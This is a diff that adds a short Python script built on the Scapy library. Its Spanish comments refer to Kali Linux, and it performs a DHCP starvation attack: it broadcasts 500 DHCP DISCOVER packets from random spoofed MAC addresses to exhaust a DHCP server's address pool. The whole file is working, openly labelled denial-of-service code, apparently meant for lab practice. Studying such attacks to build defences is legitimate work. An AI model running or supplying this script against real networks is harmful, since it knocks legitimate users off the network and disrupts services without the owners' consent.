@@ -1,0 +1,22 @@
+#!/usr/bin/env python3
+from scapy.all import *
+import random
+
+iface = "eth0"   # Ajusta según tu interfaz en Kali
+
+def random_mac():
+    return ":".join(["%02x" % random.randint(0,255) for _ in range(6)])
+
+print("[*] Iniciando ataque DHCP Starvation...")
+
+for i in range(500):  # número de solicitudes
+    mac = random_mac()
+    ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
+    ip = IP(src="0.0.0.0", dst="255.255.255.255")
+    udp = UDP(sport=68, dport=67)
+    bootp = BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")), xid=random.randint(1,900000000))
+    dhcp = DHCP(options=[("message-type","discover"),("end")])
+    pkt = ether/ip/udp/bootp/dhcp
+    sendp(pkt, iface=iface, verbose=False)
+
+print("[*] Ataque finalizado. El servidor debería tener su pool agotado.")
